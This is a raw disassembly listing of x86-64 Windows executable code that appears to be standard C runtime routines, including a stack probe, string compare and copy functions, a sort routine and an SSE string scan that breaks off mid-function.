   14000a2d6:	8b 41 14             	mov    0x14(%rcx),%eax
   14000a2d9:	48 8b d9             	mov    %rcx,%rbx
   14000a2dc:	c1 e8 0d             	shr    $0xd,%eax
   14000a2df:	a8 01                	test   $0x1,%al
   14000a2e1:	74 27                	je     0x14000a30a
   14000a2e3:	8b 41 14             	mov    0x14(%rcx),%eax
   14000a2e6:	c1 e8 06             	shr    $0x6,%eax
   14000a2e9:	a8 01                	test   $0x1,%al
   14000a2eb:	74 1d                	je     0x14000a30a
   14000a2ed:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000a2f1:	e8 de b4 ff ff       	call   0x1400057d4
   14000a2f6:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   14000a2fd:	ff 
   14000a2fe:	33 c0                	xor    %eax,%eax
   14000a300:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000a304:	48 89 03             	mov    %rax,(%rbx)
   14000a307:	89 43 10             	mov    %eax,0x10(%rbx)
   14000a30a:	48 83 c4 20          	add    $0x20,%rsp
   14000a30e:	5b                   	pop    %rbx
   14000a30f:	c3                   	ret
   14000a310:	48 83 ec 28          	sub    $0x28,%rsp
   14000a314:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000a317:	75 0d                	jne    0x14000a326
   14000a319:	e8 de bf ff ff       	call   0x1400062fc
   14000a31e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a324:	eb 42                	jmp    0x14000a368
   14000a326:	85 c9                	test   %ecx,%ecx
   14000a328:	78 2e                	js     0x14000a358
   14000a32a:	3b 0d c0 e7 00 00    	cmp    0xe7c0(%rip),%ecx        # 0x140018af0
   14000a330:	73 26                	jae    0x14000a358
   14000a332:	48 63 c9             	movslq %ecx,%rcx
   14000a335:	48 8d 15 b4 e3 00 00 	lea    0xe3b4(%rip),%rdx        # 0x1400186f0
   14000a33c:	48 8b c1             	mov    %rcx,%rax
   14000a33f:	83 e1 3f             	and    $0x3f,%ecx
   14000a342:	48 c1 f8 06          	sar    $0x6,%rax
   14000a346:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000a34a:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000a34e:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   14000a353:	83 e0 40             	and    $0x40,%eax
   14000a356:	eb 12                	jmp    0x14000a36a
   14000a358:	e8 9f bf ff ff       	call   0x1400062fc
   14000a35d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a363:	e8 68 b5 ff ff       	call   0x1400058d0
   14000a368:	33 c0                	xor    %eax,%eax
   14000a36a:	48 83 c4 28          	add    $0x28,%rsp
   14000a36e:	c3                   	ret
   14000a36f:	cc                   	int3
   14000a370:	cc                   	int3
   14000a371:	cc                   	int3
   14000a372:	cc                   	int3
   14000a373:	cc                   	int3
   14000a374:	cc                   	int3
   14000a375:	cc                   	int3
   14000a376:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000a37d:	00 00 00 
   14000a380:	48 83 ec 10          	sub    $0x10,%rsp
   14000a384:	4c 89 14 24          	mov    %r10,(%rsp)
   14000a388:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000a38d:	4d 33 db             	xor    %r11,%r11
   14000a390:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000a395:	4c 2b d0             	sub    %rax,%r10
   14000a398:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000a39c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000a3a3:	00 00 
   14000a3a5:	4d 3b d3             	cmp    %r11,%r10
   14000a3a8:	73 16                	jae    0x14000a3c0
   14000a3aa:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000a3b0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000a3b7:	41 c6 03 00          	movb   $0x0,(%r11)
   14000a3bb:	4d 3b d3             	cmp    %r11,%r10
   14000a3be:	75 f0                	jne    0x14000a3b0
   14000a3c0:	4c 8b 14 24          	mov    (%rsp),%r10
   14000a3c4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000a3c9:	48 83 c4 10          	add    $0x10,%rsp
   14000a3cd:	c3                   	ret
   14000a3ce:	cc                   	int3
   14000a3cf:	cc                   	int3
   14000a3d0:	4c 8b da             	mov    %rdx,%r11
   14000a3d3:	4c 8b d1             	mov    %rcx,%r10
   14000a3d6:	4d 85 c0             	test   %r8,%r8
   14000a3d9:	75 03                	jne    0x14000a3de
   14000a3db:	33 c0                	xor    %eax,%eax
   14000a3dd:	c3                   	ret
   14000a3de:	41 0f b7 0a          	movzwl (%r10),%ecx
   14000a3e2:	4d 8d 52 02          	lea    0x2(%r10),%r10
   14000a3e6:	41 0f b7 13          	movzwl (%r11),%edx
   14000a3ea:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   14000a3ee:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000a3f1:	83 f8 19             	cmp    $0x19,%eax
   14000a3f4:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   14000a3f8:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000a3fb:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000a3ff:	83 f8 19             	cmp    $0x19,%eax
   14000a402:	8d 4a 20             	lea    0x20(%rdx),%ecx
   14000a405:	41 8b c1             	mov    %r9d,%eax
   14000a408:	0f 47 ca             	cmova  %edx,%ecx
   14000a40b:	2b c1                	sub    %ecx,%eax
   14000a40d:	75 0b                	jne    0x14000a41a
   14000a40f:	45 85 c9             	test   %r9d,%r9d
   14000a412:	74 06                	je     0x14000a41a
   14000a414:	49 83 e8 01          	sub    $0x1,%r8
   14000a418:	75 c4                	jne    0x14000a3de
   14000a41a:	c3                   	ret
   14000a41b:	cc                   	int3
   14000a41c:	cc                   	int3
   14000a41d:	cc                   	int3
   14000a41e:	cc                   	int3
   14000a41f:	cc                   	int3
   14000a420:	41 54                	push   %r12
   14000a422:	41 55                	push   %r13
   14000a424:	41 56                	push   %r14
   14000a426:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   14000a42d:	48 8b 05 04 cc 00 00 	mov    0xcc04(%rip),%rax        # 0x140017038
   14000a434:	48 33 c4             	xor    %rsp,%rax
   14000a437:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   14000a43e:	00 
   14000a43f:	4d 8b e1             	mov    %r9,%r12
   14000a442:	4d 8b f0             	mov    %r8,%r14
   14000a445:	4c 8b e9             	mov    %rcx,%r13
   14000a448:	48 85 c9             	test   %rcx,%rcx
   14000a44b:	75 1a                	jne    0x14000a467
   14000a44d:	48 85 d2             	test   %rdx,%rdx
   14000a450:	74 15                	je     0x14000a467
   14000a452:	e8 a5 be ff ff       	call   0x1400062fc
   14000a457:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a45d:	e8 6e b4 ff ff       	call   0x1400058d0
   14000a462:	e9 38 03 00 00       	jmp    0x14000a79f
   14000a467:	4d 85 f6             	test   %r14,%r14
   14000a46a:	74 e6                	je     0x14000a452
   14000a46c:	4d 85 e4             	test   %r12,%r12
   14000a46f:	74 e1                	je     0x14000a452
   14000a471:	48 83 fa 02          	cmp    $0x2,%rdx
   14000a475:	0f 82 24 03 00 00    	jb     0x14000a79f
   14000a47b:	48 89 9c 24 48 04 00 	mov    %rbx,0x448(%rsp)
   14000a482:	00 
   14000a483:	48 89 ac 24 40 04 00 	mov    %rbp,0x440(%rsp)
   14000a48a:	00 
   14000a48b:	48 89 b4 24 38 04 00 	mov    %rsi,0x438(%rsp)
   14000a492:	00 
   14000a493:	48 89 bc 24 30 04 00 	mov    %rdi,0x430(%rsp)
   14000a49a:	00 
   14000a49b:	4c 89 bc 24 28 04 00 	mov    %r15,0x428(%rsp)
   14000a4a2:	00 
   14000a4a3:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   14000a4a7:	4d 0f af fe          	imul   %r14,%r15
   14000a4ab:	4c 03 f9             	add    %rcx,%r15
   14000a4ae:	33 c9                	xor    %ecx,%ecx
   14000a4b0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000a4b5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000a4bc:	00 00 00 00 
   14000a4c0:	33 d2                	xor    %edx,%edx
   14000a4c2:	49 8b c7             	mov    %r15,%rax
   14000a4c5:	49 2b c5             	sub    %r13,%rax
   14000a4c8:	49 f7 f6             	div    %r14
   14000a4cb:	48 8d 58 01          	lea    0x1(%rax),%rbx
   14000a4cf:	48 83 fb 08          	cmp    $0x8,%rbx
   14000a4d3:	0f 87 8b 00 00 00    	ja     0x14000a564
   14000a4d9:	4d 3b fd             	cmp    %r13,%r15
   14000a4dc:	76 65                	jbe    0x14000a543
   14000a4de:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   14000a4e2:	49 8b dd             	mov    %r13,%rbx
   14000a4e5:	48 8b fe             	mov    %rsi,%rdi
   14000a4e8:	49 3b f7             	cmp    %r15,%rsi
   14000a4eb:	77 20                	ja     0x14000a50d
   14000a4ed:	0f 1f 00             	nopl   (%rax)
   14000a4f0:	48 8b d3             	mov    %rbx,%rdx
   14000a4f3:	48 8b cf             	mov    %rdi,%rcx
   14000a4f6:	49 8b c4             	mov    %r12,%rax
   14000a4f9:	ff 15 11 fb 00 00    	call   *0xfb11(%rip)        # 0x14001a010
   14000a4ff:	85 c0                	test   %eax,%eax
   14000a501:	48 0f 4f df          	cmovg  %rdi,%rbx
   14000a505:	49 03 fe             	add    %r14,%rdi
   14000a508:	49 3b ff             	cmp    %r15,%rdi
   14000a50b:	76 e3                	jbe    0x14000a4f0
   14000a50d:	4d 8b c6             	mov    %r14,%r8
   14000a510:	49 8b d7             	mov    %r15,%rdx
   14000a513:	49 3b df             	cmp    %r15,%rbx
   14000a516:	74 1e                	je     0x14000a536
   14000a518:	49 2b df             	sub    %r15,%rbx
   14000a51b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000a520:	0f b6 02             	movzbl (%rdx),%eax
   14000a523:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   14000a527:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   14000a52a:	88 0a                	mov    %cl,(%rdx)
   14000a52c:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000a530:	49 83 e8 01          	sub    $0x1,%r8
   14000a534:	75 ea                	jne    0x14000a520
   14000a536:	4d 2b fe             	sub    %r14,%r15
   14000a539:	4d 3b fd             	cmp    %r13,%r15
   14000a53c:	77 a4                	ja     0x14000a4e2
   14000a53e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000a543:	48 83 e9 01          	sub    $0x1,%rcx
   14000a547:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000a54c:	0f 88 25 02 00 00    	js     0x14000a777
   14000a552:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   14000a557:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   14000a55e:	00 
   14000a55f:	e9 5c ff ff ff       	jmp    0x14000a4c0
   14000a564:	48 d1 eb             	shr    $1,%rbx
   14000a567:	49 8b cd             	mov    %r13,%rcx
   14000a56a:	49 0f af de          	imul   %r14,%rbx
   14000a56e:	49 8b c4             	mov    %r12,%rax
   14000a571:	4a 8d 34 2b          	lea    (%rbx,%r13,1),%rsi
   14000a575:	48 8b d6             	mov    %rsi,%rdx
   14000a578:	ff 15 92 fa 00 00    	call   *0xfa92(%rip)        # 0x14001a010
   14000a57e:	85 c0                	test   %eax,%eax
   14000a580:	7e 29                	jle    0x14000a5ab
   14000a582:	4d 8b ce             	mov    %r14,%r9
   14000a585:	4c 8b c6             	mov    %rsi,%r8
   14000a588:	4c 3b ee             	cmp    %rsi,%r13
   14000a58b:	74 1e                	je     0x14000a5ab
   14000a58d:	0f 1f 00             	nopl   (%rax)
   14000a590:	41 0f b6 00          	movzbl (%r8),%eax
   14000a594:	49 8b d0             	mov    %r8,%rdx
   14000a597:	48 2b d3             	sub    %rbx,%rdx
   14000a59a:	0f b6 0a             	movzbl (%rdx),%ecx
   14000a59d:	88 02                	mov    %al,(%rdx)
   14000a59f:	41 88 08             	mov    %cl,(%r8)
   14000a5a2:	49 ff c0             	inc    %r8
   14000a5a5:	49 83 e9 01          	sub    $0x1,%r9
   14000a5a9:	75 e5                	jne    0x14000a590
   14000a5ab:	49 8b d7             	mov    %r15,%rdx
   14000a5ae:	49 8b cd             	mov    %r13,%rcx
   14000a5b1:	49 8b c4             	mov    %r12,%rax
   14000a5b4:	ff 15 56 fa 00 00    	call   *0xfa56(%rip)        # 0x14001a010
   14000a5ba:	85 c0                	test   %eax,%eax
   14000a5bc:	7e 2a                	jle    0x14000a5e8
   14000a5be:	4d 8b c6             	mov    %r14,%r8
   14000a5c1:	49 8b d7             	mov    %r15,%rdx
   14000a5c4:	4d 3b ef             	cmp    %r15,%r13
   14000a5c7:	74 1f                	je     0x14000a5e8
   14000a5c9:	4d 8b cd             	mov    %r13,%r9
   14000a5cc:	4d 2b cf             	sub    %r15,%r9
   14000a5cf:	90                   	nop
   14000a5d0:	0f b6 02             	movzbl (%rdx),%eax
   14000a5d3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000a5d8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000a5dc:	88 0a                	mov    %cl,(%rdx)
   14000a5de:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000a5e2:	49 83 e8 01          	sub    $0x1,%r8
   14000a5e6:	75 e8                	jne    0x14000a5d0
   14000a5e8:	49 8b d7             	mov    %r15,%rdx
   14000a5eb:	48 8b ce             	mov    %rsi,%rcx
   14000a5ee:	49 8b c4             	mov    %r12,%rax
   14000a5f1:	ff 15 19 fa 00 00    	call   *0xfa19(%rip)        # 0x14001a010
   14000a5f7:	85 c0                	test   %eax,%eax
   14000a5f9:	7e 2d                	jle    0x14000a628
   14000a5fb:	4d 8b c6             	mov    %r14,%r8
   14000a5fe:	49 8b d7             	mov    %r15,%rdx
   14000a601:	49 3b f7             	cmp    %r15,%rsi
   14000a604:	74 22                	je     0x14000a628
   14000a606:	4c 8b ce             	mov    %rsi,%r9
   14000a609:	4d 2b cf             	sub    %r15,%r9
   14000a60c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000a610:	0f b6 02             	movzbl (%rdx),%eax
   14000a613:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000a618:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000a61c:	88 0a                	mov    %cl,(%rdx)
   14000a61e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000a622:	49 83 e8 01          	sub    $0x1,%r8
   14000a626:	75 e8                	jne    0x14000a610
   14000a628:	49 8b dd             	mov    %r13,%rbx
   14000a62b:	49 8b ff             	mov    %r15,%rdi
   14000a62e:	66 90                	xchg   %ax,%ax
   14000a630:	48 3b f3             	cmp    %rbx,%rsi
   14000a633:	76 1d                	jbe    0x14000a652
   14000a635:	49 03 de             	add    %r14,%rbx
   14000a638:	48 3b de             	cmp    %rsi,%rbx
   14000a63b:	73 15                	jae    0x14000a652
   14000a63d:	48 8b d6             	mov    %rsi,%rdx
   14000a640:	48 8b cb             	mov    %rbx,%rcx
   14000a643:	49 8b c4             	mov    %r12,%rax
   14000a646:	ff 15 c4 f9 00 00    	call   *0xf9c4(%rip)        # 0x14001a010
   14000a64c:	85 c0                	test   %eax,%eax
   14000a64e:	7e e5                	jle    0x14000a635
   14000a650:	eb 1e                	jmp    0x14000a670
   14000a652:	49 03 de             	add    %r14,%rbx
   14000a655:	49 3b df             	cmp    %r15,%rbx
   14000a658:	77 16                	ja     0x14000a670
   14000a65a:	48 8b d6             	mov    %rsi,%rdx
   14000a65d:	48 8b cb             	mov    %rbx,%rcx
   14000a660:	49 8b c4             	mov    %r12,%rax
   14000a663:	ff 15 a7 f9 00 00    	call   *0xf9a7(%rip)        # 0x14001a010
   14000a669:	85 c0                	test   %eax,%eax
   14000a66b:	7e e5                	jle    0x14000a652
   14000a66d:	0f 1f 00             	nopl   (%rax)
   14000a670:	48 8b ef             	mov    %rdi,%rbp
   14000a673:	49 2b fe             	sub    %r14,%rdi
   14000a676:	48 3b fe             	cmp    %rsi,%rdi
   14000a679:	76 13                	jbe    0x14000a68e
   14000a67b:	48 8b d6             	mov    %rsi,%rdx
   14000a67e:	48 8b cf             	mov    %rdi,%rcx
   14000a681:	49 8b c4             	mov    %r12,%rax
   14000a684:	ff 15 86 f9 00 00    	call   *0xf986(%rip)        # 0x14001a010
   14000a68a:	85 c0                	test   %eax,%eax
   14000a68c:	7f e2                	jg     0x14000a670
   14000a68e:	48 3b fb             	cmp    %rbx,%rdi
   14000a691:	72 38                	jb     0x14000a6cb
   14000a693:	4d 8b c6             	mov    %r14,%r8
   14000a696:	48 8b d7             	mov    %rdi,%rdx
   14000a699:	74 1e                	je     0x14000a6b9
   14000a69b:	4c 8b cb             	mov    %rbx,%r9
   14000a69e:	4c 2b cf             	sub    %rdi,%r9
   14000a6a1:	0f b6 02             	movzbl (%rdx),%eax
   14000a6a4:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000a6a9:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000a6ad:	88 0a                	mov    %cl,(%rdx)
   14000a6af:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000a6b3:	49 83 e8 01          	sub    $0x1,%r8
   14000a6b7:	75 e8                	jne    0x14000a6a1
   14000a6b9:	48 3b f7             	cmp    %rdi,%rsi
   14000a6bc:	48 8b c3             	mov    %rbx,%rax
   14000a6bf:	48 0f 45 c6          	cmovne %rsi,%rax
   14000a6c3:	48 8b f0             	mov    %rax,%rsi
   14000a6c6:	e9 65 ff ff ff       	jmp    0x14000a630
   14000a6cb:	48 3b f5             	cmp    %rbp,%rsi
   14000a6ce:	73 20                	jae    0x14000a6f0
   14000a6d0:	49 2b ee             	sub    %r14,%rbp
   14000a6d3:	48 3b ee             	cmp    %rsi,%rbp
   14000a6d6:	76 18                	jbe    0x14000a6f0
   14000a6d8:	48 8b d6             	mov    %rsi,%rdx
   14000a6db:	48 8b cd             	mov    %rbp,%rcx
   14000a6de:	49 8b c4             	mov    %r12,%rax
   14000a6e1:	ff 15 29 f9 00 00    	call   *0xf929(%rip)        # 0x14001a010
   14000a6e7:	85 c0                	test   %eax,%eax
   14000a6e9:	74 e5                	je     0x14000a6d0
   14000a6eb:	eb 1e                	jmp    0x14000a70b
   14000a6ed:	0f 1f 00             	nopl   (%rax)
   14000a6f0:	49 2b ee             	sub    %r14,%rbp
   14000a6f3:	49 3b ed             	cmp    %r13,%rbp
   14000a6f6:	76 13                	jbe    0x14000a70b
   14000a6f8:	48 8b d6             	mov    %rsi,%rdx
   14000a6fb:	48 8b cd             	mov    %rbp,%rcx
   14000a6fe:	49 8b c4             	mov    %r12,%rax
   14000a701:	ff 15 09 f9 00 00    	call   *0xf909(%rip)        # 0x14001a010
   14000a707:	85 c0                	test   %eax,%eax
   14000a709:	74 e5                	je     0x14000a6f0
   14000a70b:	49 8b cf             	mov    %r15,%rcx
   14000a70e:	48 8b c5             	mov    %rbp,%rax
   14000a711:	48 2b cb             	sub    %rbx,%rcx
   14000a714:	49 2b c5             	sub    %r13,%rax
   14000a717:	48 3b c1             	cmp    %rcx,%rax
   14000a71a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000a71f:	7c 2b                	jl     0x14000a74c
   14000a721:	4c 3b ed             	cmp    %rbp,%r13
   14000a724:	73 15                	jae    0x14000a73b
   14000a726:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   14000a72b:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   14000a732:	00 
   14000a733:	48 ff c1             	inc    %rcx
   14000a736:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000a73b:	49 3b df             	cmp    %r15,%rbx
   14000a73e:	0f 83 ff fd ff ff    	jae    0x14000a543
   14000a744:	4c 8b eb             	mov    %rbx,%r13
   14000a747:	e9 74 fd ff ff       	jmp    0x14000a4c0
   14000a74c:	49 3b df             	cmp    %r15,%rbx
   14000a74f:	73 15                	jae    0x14000a766
   14000a751:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   14000a756:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   14000a75d:	00 
   14000a75e:	48 ff c1             	inc    %rcx
   14000a761:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000a766:	4c 3b ed             	cmp    %rbp,%r13
   14000a769:	0f 83 d4 fd ff ff    	jae    0x14000a543
   14000a76f:	4c 8b fd             	mov    %rbp,%r15
   14000a772:	e9 49 fd ff ff       	jmp    0x14000a4c0
   14000a777:	48 8b bc 24 30 04 00 	mov    0x430(%rsp),%rdi
   14000a77e:	00 
   14000a77f:	48 8b b4 24 38 04 00 	mov    0x438(%rsp),%rsi
   14000a786:	00 
   14000a787:	48 8b ac 24 40 04 00 	mov    0x440(%rsp),%rbp
   14000a78e:	00 
   14000a78f:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   14000a796:	00 
   14000a797:	4c 8b bc 24 28 04 00 	mov    0x428(%rsp),%r15
   14000a79e:	00 
   14000a79f:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   14000a7a6:	00 
   14000a7a7:	48 33 cc             	xor    %rsp,%rcx
   14000a7aa:	e8 71 6b ff ff       	call   0x140001320
   14000a7af:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   14000a7b6:	41 5e                	pop    %r14
   14000a7b8:	41 5d                	pop    %r13
   14000a7ba:	41 5c                	pop    %r12
   14000a7bc:	c3                   	ret
   14000a7bd:	cc                   	int3
   14000a7be:	cc                   	int3
   14000a7bf:	cc                   	int3
   14000a7c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a7c5:	57                   	push   %rdi
   14000a7c6:	48 83 ec 20          	sub    $0x20,%rsp
   14000a7ca:	45 33 d2             	xor    %r10d,%r10d
   14000a7cd:	49 8b d8             	mov    %r8,%rbx
   14000a7d0:	4c 8b da             	mov    %rdx,%r11
   14000a7d3:	4d 85 c9             	test   %r9,%r9
   14000a7d6:	75 2c                	jne    0x14000a804
   14000a7d8:	48 85 c9             	test   %rcx,%rcx
   14000a7db:	75 2c                	jne    0x14000a809
   14000a7dd:	48 85 d2             	test   %rdx,%rdx
   14000a7e0:	74 14                	je     0x14000a7f6
   14000a7e2:	e8 15 bb ff ff       	call   0x1400062fc
   14000a7e7:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000a7ec:	89 18                	mov    %ebx,(%rax)
   14000a7ee:	e8 dd b0 ff ff       	call   0x1400058d0
   14000a7f3:	44 8b d3             	mov    %ebx,%r10d
   14000a7f6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a7fb:	41 8b c2             	mov    %r10d,%eax
   14000a7fe:	48 83 c4 20          	add    $0x20,%rsp
   14000a802:	5f                   	pop    %rdi
   14000a803:	c3                   	ret
   14000a804:	48 85 c9             	test   %rcx,%rcx
   14000a807:	74 d9                	je     0x14000a7e2
   14000a809:	4d 85 db             	test   %r11,%r11
   14000a80c:	74 d4                	je     0x14000a7e2
   14000a80e:	4d 85 c9             	test   %r9,%r9
   14000a811:	75 05                	jne    0x14000a818
   14000a813:	44 88 11             	mov    %r10b,(%rcx)
   14000a816:	eb de                	jmp    0x14000a7f6
   14000a818:	48 85 db             	test   %rbx,%rbx
   14000a81b:	75 05                	jne    0x14000a822
   14000a81d:	44 88 11             	mov    %r10b,(%rcx)
   14000a820:	eb c0                	jmp    0x14000a7e2
   14000a822:	48 2b d9             	sub    %rcx,%rbx
   14000a825:	48 8b d1             	mov    %rcx,%rdx
   14000a828:	4d 8b c3             	mov    %r11,%r8
   14000a82b:	49 8b f9             	mov    %r9,%rdi
   14000a82e:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000a832:	75 14                	jne    0x14000a848
   14000a834:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   14000a837:	88 02                	mov    %al,(%rdx)
   14000a839:	48 ff c2             	inc    %rdx
   14000a83c:	84 c0                	test   %al,%al
   14000a83e:	74 28                	je     0x14000a868
   14000a840:	49 83 e8 01          	sub    $0x1,%r8
   14000a844:	75 ee                	jne    0x14000a834
   14000a846:	eb 20                	jmp    0x14000a868
   14000a848:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   14000a84b:	88 02                	mov    %al,(%rdx)
   14000a84d:	48 ff c2             	inc    %rdx
   14000a850:	84 c0                	test   %al,%al
   14000a852:	74 0c                	je     0x14000a860
   14000a854:	49 83 e8 01          	sub    $0x1,%r8
   14000a858:	74 06                	je     0x14000a860
   14000a85a:	48 83 ef 01          	sub    $0x1,%rdi
   14000a85e:	75 e8                	jne    0x14000a848
   14000a860:	48 85 ff             	test   %rdi,%rdi
   14000a863:	75 03                	jne    0x14000a868
   14000a865:	44 88 12             	mov    %r10b,(%rdx)
   14000a868:	4d 85 c0             	test   %r8,%r8
   14000a86b:	75 89                	jne    0x14000a7f6
   14000a86d:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000a871:	75 0e                	jne    0x14000a881
   14000a873:	46 88 54 19 ff       	mov    %r10b,-0x1(%rcx,%r11,1)
   14000a878:	45 8d 50 50          	lea    0x50(%r8),%r10d
   14000a87c:	e9 75 ff ff ff       	jmp    0x14000a7f6
   14000a881:	44 88 11             	mov    %r10b,(%rcx)
   14000a884:	e8 73 ba ff ff       	call   0x1400062fc
   14000a889:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000a88e:	e9 59 ff ff ff       	jmp    0x14000a7ec
   14000a893:	cc                   	int3
   14000a894:	cc                   	int3
   14000a895:	cc                   	int3
   14000a896:	cc                   	int3
   14000a897:	cc                   	int3
   14000a898:	cc                   	int3
   14000a899:	cc                   	int3
   14000a89a:	cc                   	int3
   14000a89b:	cc                   	int3
   14000a89c:	cc                   	int3
   14000a89d:	cc                   	int3
   14000a89e:	cc                   	int3
   14000a89f:	cc                   	int3
   14000a8a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a8a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a8aa:	57                   	push   %rdi
   14000a8ab:	4c 8b d2             	mov    %rdx,%r10
   14000a8ae:	48 8d 35 4b 57 ff ff 	lea    -0xa8b5(%rip),%rsi        # 0x140000000
   14000a8b5:	41 83 e2 0f          	and    $0xf,%r10d
   14000a8b9:	48 8b fa             	mov    %rdx,%rdi
   14000a8bc:	49 2b fa             	sub    %r10,%rdi
   14000a8bf:	48 8b da             	mov    %rdx,%rbx
   14000a8c2:	4c 8b c1             	mov    %rcx,%r8
   14000a8c5:	0f 57 db             	xorps  %xmm3,%xmm3
   14000a8c8:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   14000a8cc:	f3 0f 6f 0f          	movdqu (%rdi),%xmm1
   14000a8d0:	48 83 f8 0e          	cmp    $0xe,%rax
   14000a8d4:	77 73                	ja     0x14000a949
   14000a8d6:	8b 84 86 ac ab 00 00 	mov    0xabac(%rsi,%rax,4),%eax
   14000a8dd:	48 03 c6             	add    %rsi,%rax
   14000a8e0:	ff e0                	jmp    *%rax
   14000a8e2:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   14000a8e7:	eb 60                	jmp    0x14000a949
   14000a8e9:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   14000a8ee:	eb 59                	jmp    0x14000a949
   14000a8f0:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   14000a8f5:	eb 52                	jmp    0x14000a949
   14000a8f7:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   14000a8fc:	eb 4b                	jmp    0x14000a949
   14000a8fe:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   14000a903:	eb 44                	jmp    0x14000a949
   14000a905:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   14000a90a:	eb 3d                	jmp    0x14000a949
   14000a90c:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   14000a911:	eb 36                	jmp    0x14000a949
   14000a913:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   14000a918:	eb 2f                	jmp    0x14000a949
   14000a91a:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   14000a91f:	eb 28                	jmp    0x14000a949
   14000a921:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   14000a926:	eb 21                	jmp    0x14000a949
   14000a928:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   14000a92d:	eb 1a                	jmp    0x14000a949
   14000a92f:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   14000a934:	eb 13                	jmp    0x14000a949
   14000a936:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   14000a93b:	eb 0c                	jmp    0x14000a949
   14000a93d:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   14000a942:	eb 05                	jmp    0x14000a949
   14000a944:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   14000a949:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000a94c:	41 b9 0f 00 00 00    	mov    $0xf,%r9d
   14000a952:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000a956:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000a95a:	85 c0                	test   %eax,%eax
